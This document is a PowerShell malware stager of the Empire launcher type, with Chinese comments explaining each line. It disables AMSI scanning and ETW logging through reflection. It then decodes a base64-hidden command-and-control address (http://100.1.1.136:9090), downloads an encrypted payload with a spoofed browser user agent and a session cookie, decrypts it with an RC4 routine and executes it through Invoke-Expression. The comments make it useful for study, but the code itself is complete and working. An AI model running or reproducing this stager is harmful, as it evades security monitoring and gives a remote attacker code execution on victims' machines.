# 检查 PowerShell 版本是否为 3 及以上
If ($PSVersionTable.PSVersion.Major -ge 3) {
    # 禁用 AMSI (Antimalware Scan Interface) 以规避潜在的扫描
    $Ref = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');
    $Ref.GetField('amsiInitFailed', 'NonPublic,Static').SetValue($Null, $true);

    # 禁用 PowerShell 的 ETW (Event Tracing for Windows) 日志记录
    [System.Diagnostics.Eventing.EventProvider].GetField('m_enabled', 'NonPublic,Instance').SetValue(
        [Ref].Assembly.GetType(
            'System.Management.Automation.Tracing.PSEtwLogProvider'
        ).GetField(
            'etwProvider', 'NonPublic,Static'
        ).GetValue($null), 
        0
    );
}

# 禁用 HTTP 请求中的 "Expect: 100-Continue" 标头
[System.Net.ServicePointManager]::Expect100Continue = 0;

# 创建 System.Net.WebClient 类的新实例
$wc = New-Object System.Net.WebClient;

# 定义用于 HTTP 请求头的用户代理字符串
$u = 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';

# 解码并存储 base64 编码的服务器 URL
# "h\u0000t\u0000t\u0000p\u0000:\u0000/\u0000/\u00001\u00000\u00000\u0000.\u00001\u0000.\u00001\u0000.\u00001\u00003\u00006\u0000:\u00009\u00000\u00009\u00000\u0000"
# "http://100.1.1.136:9090"
$ser = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwAxADAAMAAuADEALgAxAC4AMQAzADYAOgA5ADAAOQAwAA==')));

# 定义目标 URL 路径
$t = '/login/process.php';

# 将用户代理标头添加到 Web 客户端
$wc.Headers.Add('User-Agent', $u);

# 配置 Web 客户端以使用默认的系统代理设置
$wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy;
$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
$Script:Proxy = $wc.Proxy;

# 将加密密钥转换为 ASCII 字节
$K = [System.Text.Encoding]::ASCII.GetBytes('Huv,3gtsc}#_E:fFXwn2bUPV|iMe0+5R');

# 定义用于自定义加密算法的函数
$R = {
    $D, $K = $Args;
    $S = 0..255;
    0..255 | % {
        $J = ($J + $S[$_] + $K[$_ % $K.Count]) % 256;
        $S[$_], $S[$J] = $S[$J], $S[$_];
    };
    $D | % {
        $I = ($I + 1) % 256;
        $H = ($H + $S[$I]) % 256;
        $S[$I], $S[$H] = $S[$H], $S[$I];
        $_ -bxor $S[($S[$I] + $S[$H]) % 256];
    };
};

# 将特定的 Cookie 添加到 Web 客户端标头
$wc.Headers.Add("Cookie", "cHGAfdLZDCEtLMK=lLq8UwiEuzvIQD4j7p6IJshii1E=");

# 从指定的 URL 下载数据并将其存储在 $data 中
$data = $wc.DownloadData($ser + $t);

# 从下载的数据中提取初始化向量 (IV)
$iv = $data[0..3];                 

# 从下载的数据中移除 IV
$data = $data[4..$data.length];

# 使用自定义加密函数对数据进行解密并执行
-join [Char[]](& $R $data ($IV + $K)) | IEX
